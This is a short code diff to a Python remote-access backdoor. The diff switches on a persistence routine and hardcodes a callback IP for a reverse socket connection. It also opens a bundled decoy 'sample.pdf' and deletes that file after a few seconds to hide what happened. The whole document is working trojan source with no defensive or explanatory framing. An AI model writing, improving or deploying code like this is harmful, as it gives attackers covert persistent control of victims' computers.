@@ -16,7 +16,7 @@ class Backdoor:
     
     
     def __init__(self,ip,port):
-        #self.persist()
+        self.persist()
         self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         try:
             self.connection.connect((str(ip),int(port)))
@@ -223,8 +223,10 @@ class Backdoor:
 try:
     front = sys._MEIPASS + "\\sample.pdf"
     subprocess.Popen(front,shell=True)
+    time.sleep(5)
+    os.remove(front)
     args = Args()
-    backdoor = Backdoor(arps.ip,args.port)
+    backdoor = Backdoor("192.168.86.109",args.port)
     backdoor.run()
 except KeyboardInterrupt:
     sys.exit()
